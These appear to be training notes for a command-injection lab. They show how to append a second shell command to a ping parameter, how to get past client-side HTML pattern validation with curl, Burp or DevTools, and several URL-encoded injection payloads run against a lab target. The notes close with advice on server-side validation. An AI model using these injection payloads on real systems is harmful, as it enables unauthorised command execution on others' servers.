# Section 3 — Injecting Commands

---

## Constructing the Payload

Original command:
```
ping -c 1 <USER_IP>
```

Inject:
```
USER_IP = 127.0.0.1; whoami
```

Result:
```
ping -c 1 127.0.0.1; whoami    →    runs ping then runs whoami
```

Test on your own shell first:
```bash
ping -c 1 127.0.0.1; whoami
# PING 127.0.0.1 ... 1 packets transmitted, 1 received
# yourusername
```

---

## Bypassing Front-End Validation

When the HTML has `pattern="..."`, the browser blocks malformed submissions client-side. Bypass by:

### Method 1 — curl (fastest)
```bash
curl -sk -X POST "http://TARGET/" --data-urlencode "ip=127.0.0.1; whoami"
```

### Method 2 — Burp Repeater
1. Submit a valid request (IP only) through the browser
2. Burp catches it → right-click → Send to Repeater
3. Edit the `ip=` parameter to include the injection
4. URL-encode the payload (`Ctrl+U` in Burp): `127.0.0.1%3B+whoami`
5. Click Send

### Method 3 — Remove `pattern` attribute in DevTools
1. F12 → Inspector → find `<input pattern="...">` element
2. Delete the `pattern` attribute
3. Now the browser submits anything

---

## URL Encoding the Special Chars

When injecting via URL/form params, encode characters that would otherwise be parsed:

| Char | URL-encoded |
|------|-------------|
| `;` | `%3b` |
| `&` | `%26` |
| `|` | `%7c` |
| `\n` | `%0a` |
| space | `%20` or `+` |
| `$` | `%24` |
| `(` `)` | `%28` `%29` |
| `` ` `` | `%60` |

Most useful examples:
```
127.0.0.1%3b+whoami           ← ; whoami
127.0.0.1%7c+whoami            ← | whoami  
127.0.0.1%26%26+whoami         ← && whoami
127.0.0.1%0awhoami             ← newline whoami
127.0.0.1+%24%28whoami%29      ← $(whoami)
```

> Using `--data-urlencode` in curl encodes for you — saves manual escaping.

---

## Lab — Bypass + Find Validation Source

**Target:** `154.57.164.66:32362`

### Bypass and execute
```bash
curl -sk -X POST "http://154.57.164.66:32362/" --data-urlencode "ip=127.0.0.1; whoami"
# Response includes ping output + whoami output (e.g., "www-data")
```

### Q1 — Find the line where front-end validation lives

```bash
curl -sk "http://154.57.164.66:32362/" | cat -n | grep -E 'pattern=|validate|onsubmit'
```

Line 17:
```html
<input type="text" name="ip" placeholder="127.0.0.1"
       pattern="^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$">
```

The `pattern="..."` regex is the front-end validation. Browsers refuse to submit input that doesn't match the IPv4 format — but the **server has no equivalent check**.

**Q1 Answer:** `17`

---

## Why This Pattern Is Common

The IPv4 regex looks robust:
```
^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$
```

It correctly validates a real IP address character-by-character. But it's an **HTML attribute** — anyone can:
- View source and see the pattern
- Bypass via curl/Postman/Burp/any HTTP client that's not a browser
- Delete the attribute in DevTools

Defenders often shop-floor copy a strict regex into the form, then forget to copy the equivalent check into the server-side handler. That's the entire vulnerability.

---

## Exam Notes

- The HTML5 `pattern=` attribute is the most common front-end-only validation pattern — find it on any input field that takes structured data (IP, email, phone, etc.)
- Browsers display "Please match the requested format" when validation fails — this is the same string as Section 2's Q1
- View source (`Ctrl+U`) is the fastest way to spot client-side validation — look for `pattern=`, `oninput=`, `onsubmit=`, JavaScript validation functions
- URL-encoding (`%3b` etc.) is required when sending through web proxies; `curl --data-urlencode` handles it automatically
- For real engagements: front-end validation IS useful UX — but it's never security. The fix is duplicate validation on the server side, then sanitize again before shell invocation.
